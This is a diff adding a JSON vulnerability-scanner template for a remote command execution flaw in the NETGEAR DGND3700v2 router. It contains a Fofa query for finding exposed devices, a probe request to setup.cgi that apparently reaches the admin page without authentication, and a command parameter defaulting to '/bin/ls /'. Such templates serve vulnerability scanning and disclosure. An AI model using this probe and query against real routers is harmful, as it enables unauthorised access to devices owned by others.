@@ -1,0 +1,121 @@
+{
+  "Name": "NETGEAR DGND3700v2 路由器 c4_IPAddr 远程命令执行漏洞",
+  "Description": "<p>NETGEAR DGND3700v2 是一款高效的企业路由器。</p><p>NETGEAR DGND3700v2 存在命令执行漏洞，攻击者可执行任意命令，控制服务器权限。</p>",
+  "Product": "NETGEAR DGND3700v2",
+  "Homepage": "https://www.netgear.com/",
+  "DisclosureDate": "2022-02-21",
+  "Author": "keeeee",
+  "FofaQuery": "title=\"DGND3700v2\"",
+  "GobyQuery": "title=\"DGND3700v2\"",
+  "Level": "3",
+  "Impact": "<p>NETGEAR DGND3700v2 存在命令执行漏洞，攻击者可执行任意命令，控制服务器权限。</p>",
+  "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"https://www.netgear.com/\">https://www.netgear.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
+  "Translation": {
+    "CN": {
+      "Name": "NETGEAR DGND3700v2 路由器 c4_IPAddr 远程命令执行漏洞",
+      "Product": "NETGEAR DGND3700v2",
+      "Description": "<p>NETGEAR DGND3700v2 是一款高效的企业路由器。</p><p>NETGEAR DGND3700v2 存在命令执行漏洞，攻击者可执行任意命令，控制服务器权限。</p>",
+      "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"https://www.netgear.com/\">https://www.netgear.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
+      "Impact": "<p>NETGEAR DGND3700v2 存在命令执行漏洞，攻击者可执行任意命令，控制服务器权限。</p>",
+      "VulType": [
+        "命令执行"
+      ],
+      "Tags": [
+        "命令执行"
+      ]
+    },
+    "EN": {
+      "Name": "NETGEAR DGND3700v2 c4_IPAddr RCE",
+      "Product": "NETGEAR DGND3700v2",
+      "Description": "<p>The NETGEAR DGND3700v2 is an efficient enterprise router.</p><p>NETGEAR DGND3700v2 has a command execution vulnerability, an attacker can execute arbitrary commands and control server permissions.</p>",
+      "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.netgear.com/\">https://www.netgear.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
+      "Impact": "<p>NETGEAR DGND3700v2 has a command execution vulnerability, an attacker can execute arbitrary commands and control server permissions.</p>",
+      "VulType": [
+        "rce"
+      ],
+      "Tags": [
+        "rce"
+      ]
+    }
+  },
+  "References": [
+    "https://ssd-disclosure.com/ssd-advisory-netgear-dgnd3700v2-preauth-root-access/"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "/bin/ls /"
+    }
+  ],
+  "is0day": false,
+  "ExpTips": {
+    "type": "Tips",
+    "content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm",
+        "follow_redirect": false,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "Router Admin",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "Tags": [
+    "命令执行"
+  ],
+  "VulType": [
+    "命令执行"
+  ],
+  "CVEIDs": [
+    ""
+  ],
+  "CVSSScore": "9.8",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": [
+      "router"
+    ]
+  },
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    "CNVD-2022-22338"
+  ],
+  "ExploitSteps": [
+    "AND"
+  ]
+}
